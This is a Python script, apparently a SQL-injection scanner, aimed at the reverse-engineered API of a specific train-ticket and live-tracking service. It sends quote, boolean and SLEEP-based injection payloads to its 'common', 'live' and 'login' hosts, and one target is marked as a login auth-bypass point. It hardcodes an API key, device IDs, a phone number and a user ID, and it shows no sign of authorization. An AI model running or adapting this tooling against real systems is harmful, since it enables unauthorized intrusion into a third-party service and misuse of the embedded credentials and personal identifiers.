#!/usr/bin/env python3
"""
Differential SQL-injection verifier for the brex-common endpoint.

WHY THIS EXISTS
---------------
The previous script flagged "every parameter" as vulnerable. That was a
FALSE POSITIVE caused by two bugs:
  1. is_vulnerable() only checked whether a SQL keyword appeared in the
     response - it never compared the injected response against a clean
     baseline. If the endpoint returns a verbose SQL error for ANY bad
     request, every probe looks "vulnerable".
  2. The time-based probe used SLEEP(2) with `--max-time 2`, so curl cut
     the request off exactly when a successful sleep would return ->
     guaranteed false negative.

This script fixes both. For each target parameter it sends a small, fixed
set of probes and DECIDES from the DIFFERENCES between responses, not from
the presence of a keyword. It does not increase attack surface - it is the
minimum set of requests needed to reach a verdict.

Probes per parameter:
  P0 clean      : a legitimate value          (baseline)
  P1 squote     : '                           unbalanced -> errors ONLY if
                                               input reaches a raw SQL string
  P2 balanced   : ''                           balanced -> should NOT error
                                               if P1 did (this is the tell)
  P3 bool-true  : ' OR '1'='1
  P4 bool-false : ' AND '1'='2
  P5 time-based : ' AND SLEEP(5)-- -           measured, generous curl timeout

Verdict:
  - P0 == P1 == P2 (normalised)   -> CONSTANT BASELINE  (NOT injection)
  - P1 errors and P2 does not     -> ERROR-BASED candidate
  - P3 and P4 differ meaningfully -> BOOLEAN-BLIND candidate
  - P5 elapsed >> baseline        -> TIME-BASED candidate
"""

import urllib.parse
import json
import random
import subprocess
import time
import difflib

HOSTS = {
    "common": "https://brex-common.suncrops.com/dotframe/v100/index4.php",
    "live":   "https://brex-live.suncrops.com/dotframe/v100/index4.php",
    "login":  "https://brex-login.suncrops.com/dotframe/v100/index4.php",
}
UKEY = "2fdf1de5701d6709466a5e3cd41e7693"

BASE = {
    "deviceID": "D2026080701220698623",
    "hwDeviceID": "658c2465d309d1f4",
    "deviceInfo": "WayDroid x86_64",
    "appVersion": "1.82.12.0",
    "phone": "01833054648",
    "uID": "122307",
    "os": "android",
}

# curl hard timeout must be well ABOVE the SLEEP() we ask for, otherwise a
# successful time-based injection gets cut off and looks like a failure.
CURL_MAX_TIME = 12
SLEEP_SECONDS = 5
DELAY_BETWEEN_REQUESTS = 0.6  # be gentle on the server


def call(action, overrides, host="common"):
    """Send one request. Returns (raw_response_text, elapsed_seconds, sent_txID)."""
    j = dict(BASE)
    tx = str(random.randint(10**16, 10**17 - 1))
    j.update({"action": action, "txID": tx, "upass": "wrong"})
    j.update(overrides)

    body = "data=" + urllib.parse.quote(json.dumps(j, separators=(",", ":")))
    cmd = [
        "curl", "-s", "--compressed",
        "--max-time", str(CURL_MAX_TIME),
        "-X", "POST", HOSTS[host],
        "-H", f"uKey: {UKEY}",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", "User-Agent: okhttp/3.14.9",
        "--data-binary", body,
    ]
    start = time.time()
    out = subprocess.run(cmd, capture_output=True, text=True)
    elapsed = time.time() - start
    time.sleep(DELAY_BETWEEN_REQUESTS)
    return out.stdout.strip(), elapsed, tx


def normalise(resp, tx):
    """
    Strip volatile bits so semantically-identical responses compare equal.
    Without this, an echoed txID or a server timestamp makes every response
    look 'different' and produces its own false positives.
    """
    s = resp.lower()
    s = s.replace(tx.lower(), "<txid>")
    # collapse any run of >=6 digits (timestamps, ids, epoch, etc.)
    out, run = [], 0
    for ch in s:
        if ch.isdigit():
            run += 1
        else:
            if run >= 6:
                out.append("<num>")
            elif run:
                out.append("#" * run)
            run = 0
            out.append(ch)
    if run >= 6:
        out.append("<num>")
    elif run:
        out.append("#" * run)
    return "".join(out)


SQL_TOKENS = [
    "sqlstate", "syntax error", "mysql", "1064", "42000",
    "you have an error in your sql syntax", "warning:", "fatal error",
]


def has_sql_error(resp):
    low = resp.lower()
    return any(tok in low for tok in SQL_TOKENS)


def similar(a, b):
    """0..1 similarity between two normalised strings."""
    if not a and not b:
        return 1.0
    return difflib.SequenceMatcher(None, a, b).ratio()


def probe_param(action, base_overrides, param, clean_value, host="common"):
    print("\n" + "=" * 78)
    print(f"PARAM: {action}.{param}  [{host}]  (clean='{clean_value}')")
    print("=" * 78)

    payloads = {
        "P0 clean":     clean_value,
        "P1 squote":    clean_value + "'",
        "P2 balanced":  clean_value + "''",
        "P3 bool-true": clean_value + "' OR '1'='1",
        "P4 bool-false": clean_value + "' AND '1'='2",
        "P5 time":      clean_value + "' AND SLEEP(%d)-- -" % SLEEP_SECONDS,
    }

    results = {}
    for label, payload in payloads.items():
        ov = dict(base_overrides)
        ov[param] = payload
        resp, elapsed, tx = call(action, ov, host)
        results[label] = {
            "raw": resp,
            "norm": normalise(resp, tx),
            "elapsed": elapsed,
            "sql_err": has_sql_error(resp),
        }
        flag = "SQL-err" if results[label]["sql_err"] else "ok"
        print(f"  {label:12} {elapsed:5.2f}s  [{flag:7}]  {resp[:110]!r}")

    # ---- verdict logic ----
    r = results
    base = r["P0 clean"]
    findings = []

    sim01 = similar(base["norm"], r["P1 squote"]["norm"])
    sim02 = similar(base["norm"], r["P2 balanced"]["norm"])
    sim34 = similar(r["P3 bool-true"]["norm"], r["P4 bool-false"]["norm"])

    # 1) constant baseline: injection chars change nothing
    if sim01 > 0.97 and sim02 > 0.97:
        findings.append(
            "CONSTANT BASELINE - single-quote and balanced-quote responses are "
            "identical to clean. The SQL error (if any) is unconditional, NOT "
            "driven by your input reaching the query. This is error DISCLOSURE, "
            "not injection."
        )

    # 2) error-based: unbalanced quote errors, balanced does not
    if r["P1 squote"]["sql_err"] and not r["P2 balanced"]["sql_err"] \
            and sim02 > sim01:
        findings.append(
            "ERROR-BASED CANDIDATE - a single quote triggers a SQL error but a "
            "balanced pair does not. This is the classic signature of input "
            "reaching an unparameterised query. Confirm before trusting."
        )

    # 3) boolean-blind: true vs false payloads diverge
    if sim34 < 0.9:
        findings.append(
            f"BOOLEAN-BLIND CANDIDATE - true/false payloads produce different "
            f"responses (similarity {sim34:.2f}). Check that clean/'1'='1' looks "
            f"like normal data and '1'='2' looks empty."
        )

    # 4) time-based: sleep payload noticeably slower than baseline
    delta = r["P5 time"]["elapsed"] - base["elapsed"]
    if delta > (SLEEP_SECONDS - 1.5):
        findings.append(
            f"TIME-BASED CANDIDATE - SLEEP({SLEEP_SECONDS}) payload took "
            f"{r['P5 time']['elapsed']:.2f}s vs baseline {base['elapsed']:.2f}s "
            f"(+{delta:.2f}s). Strong signal - re-run 2-3x to rule out network jitter."
        )

    print("\n  VERDICT:")
    if findings:
        for f in findings:
            print("   * " + f)
    else:
        print("   * INCONCLUSIVE - no differential signal. Not obviously "
              "injectable via this parameter.")

    # show the clean-vs-squote diff so a human can eyeball it
    if sim01 < 0.999:
        print("\n  clean -> squote diff (normalised):")
        diff = difflib.unified_diff(
            base["norm"].splitlines(), r["P1 squote"]["norm"].splitlines(),
            lineterm="", n=0,
        )
        for line in list(diff)[:12]:
            print("   " + line)

    return findings


# ---------------------------------------------------------------------------
# Targets: (action, host, extra fixed params, parameter-to-test, clean value)
#
# Covers every action + user-controlled parameter from the reverse-engineered
# API map. Some clean values are best-effort guesses (station names, train
# class); the differential test still works even if the clean value returns an
# error, because we compare P1/P2 against whatever P0 is.
# ---------------------------------------------------------------------------
STN_FROM, STN_TO = "Dhaka", "Chattogram"
TRAIN_ID = "741"

TARGETS = [
    # --- read actions (no auth) : the routes/stations/fare surface ----------
    ("getTrainListByFromToStations", "common", {"stnTo": STN_TO},  "stnFrom", STN_FROM),
    ("getTrainListByFromToStations", "common", {"stnFrom": STN_FROM}, "stnTo", STN_TO),
    ("stationsBasedOnTrainID",       "common", {},                 "key",     TRAIN_ID),
    ("getTrainTicketFare",           "common",
        {"toStation": STN_TO, "trainName": "SUBARNA EXPRESS", "trainClass": "S_CHAIR"},
        "fromStation", STN_FROM),
    ("getTrainTicketFare",           "common",
        {"fromStation": STN_FROM, "toStation": STN_TO, "trainClass": "S_CHAIR"},
        "trainName", "SUBARNA EXPRESS"),

    # --- live host ----------------------------------------------------------
    ("getTrainLocationByTrainID",    "live",   {"lat": "0", "lon": "0"}, "key", TRAIN_ID),

    # --- device-tracking params : logged to DB, prime INSERT-injection spots -
    ("getTrainListByFromToStations", "common",
        {"stnFrom": STN_FROM, "stnTo": STN_TO}, "deviceID",   BASE["deviceID"]),
    ("getTrainListByFromToStations", "common",
        {"stnFrom": STN_FROM, "stnTo": STN_TO}, "hwDeviceID", BASE["hwDeviceID"]),

    # --- account actions ----------------------------------------------------
    ("getUserAccountInfo",                  "common", {}, "phone", BASE["phone"]),
    ("getUserAccountInfo",                  "common", {}, "uID",   BASE["uID"]),
    ("getUserTransactionHistoryList",       "common", {}, "phone", BASE["phone"]),
    ("getUserTransactionHistoryList",       "common", {}, "uID",   BASE["uID"]),
    ("getUserLiveTrainLocationHistoryList", "common", {}, "phone", BASE["phone"]),
    ("getUserLiveTrainLocationHistoryList", "common", {}, "uID",   BASE["uID"]),
    ("getAllPackageList",                   "common", {}, "phone", BASE["phone"]),

    # --- login : classic auth-bypass injection point ------------------------
    ("userLogin", "login", {"uPass": "wrong"}, "phone", BASE["phone"]),
    ("userLogin", "login", {"phone": BASE["phone"]}, "uPass", "wrong"),
]


def main():
    print("Differential SQLi verifier - decides by response DIFFERENCE, not keywords.")
    print(f"Hosts: {', '.join(HOSTS)}")
    print(f"curl --max-time={CURL_MAX_TIME}s  sleep-probe={SLEEP_SECONDS}s  targets={len(TARGETS)}")

    summary = {}
    for action, host, extra, param, clean in TARGETS:
        findings = probe_param(action, extra, param, clean, host)
        summary[f"{action}.{param}"] = findings

    print("\n" + "=" * 78)
    print("SUMMARY")
    print("=" * 78)
    for name, findings in summary.items():
        if not findings:
            print(f"  {name:40} inconclusive / not injectable")
        else:
            tags = []
            for f in findings:
                tags.append(f.split(" -")[0].split(" - ")[0])
            print(f"  {name:40} {', '.join(tags)}")

    print("\nRemember: a 'CANDIDATE' is a lead, not proof. Confirm error-based "
          "and boolean leads by hand, and re-run time-based to beat jitter.")


if __name__ == "__main__":
    main()
